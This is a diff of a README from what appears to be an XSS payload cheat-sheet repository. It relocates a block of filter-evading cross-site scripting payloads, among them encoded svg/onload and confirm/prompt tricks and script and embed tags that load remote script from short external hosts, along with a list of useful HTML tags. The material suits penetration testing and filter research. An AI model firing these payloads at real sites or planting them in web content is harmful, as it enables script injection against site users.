@@ -32,6 +32,40 @@ Put this repo on watch. I will be updating it regularly.
 - [BeEF](https://github.com/beefproject/beef)
 - [JShell](https://github.com/UltimateHackers/JShell)
 
+### Awesome Payloads
+```
+<--`<img/src=` onerror=alert(1)> --!>
+<svg%0Aonload=%09((pro\u006dpt))()//
+<sCript x>(((confirm)))``</scRipt x>
+<svg/x=">"/onload=confirm()//
+<svg </onload ="1> (_=prompt,_(1)) "">
+<embed src=//14.rs>
+<script x=">" src=//15.rs></script>
+<!'/*"/*/'/*/"/*--></Script><Image SrcSet=K */; OnError=confirm`1` //>
+<iframe/src \/\/onload = prompt(1)
+<x oncut=alert()>x
+<details ontoggle=confirm()>
+<svg onload=write()>
+<script y="><">/*<script* */prompt()</script
+<w="/x="y>"/ondblclick=`<`[confir\u006d``]>z
+```
+
+Some HTML Tags that you will be using
+```
+img
+svg
+body
+html
+embed
+script
+object
+details
+isindex
+iframe
+audio
+video
+```
+
 ### Awesome Context Breaking
 
 #### Simple Context
@@ -56,24 +90,6 @@ Put this repo on watch. I will be updating it regularly.
 </script><svg onload=alert()>
 ```
 
-### Awesome Payloads
-```
-<--`<img/src=` onerror=alert(1)> --!>
-<svg%0Aonload=%09((pro\u006dpt))()//
-<sCript x>(((confirm)))``</scRipt x>
-<svg/x=">"/onload=confirm()//
-<svg </onload ="1> (_=prompt,_(1)) "">
-<embed src=//14.rs>
-<script x=">" src=//15.rs></script>
-<!'/*"/*/'/*/"/*--></Script><Image SrcSet=K */; OnError=confirm`1` //>
-<iframe/src \/\/onload = prompt(1)
-<x oncut=alert()>x
-<details ontoggle=confirm()>
-<svg onload=write()>
-<script y="><">/*<script* */prompt()</script
-<w="/x="y>"/ondblclick=`<`[confir\u006d``]>z
-```
-
 ### Awesome Confirm Variants
 Yep, confirm because alert is too mainstream.
 ```
@@ -90,21 +106,6 @@ A good compilation of advanced XSS exploits can be found [here](http://www.xss-p
 - [105 Event Handlers with description](https://github.com/UltimateHackers/AwesomeXSS/blob/master/Database/event-handlers.md)
 - [200 Event Handlers without description](http://pastebin.com/raw/WwcBmz5J)
 
-Some HTML Tags that you will be using
-```
-img
-svg
-body
-html
-embed
-script
-object
-details
-isindex
-iframe
-audio
-video
-```
 
 ### Awesome Probing
 If nothing of this works, take a look at **Awesome Bypassing** section
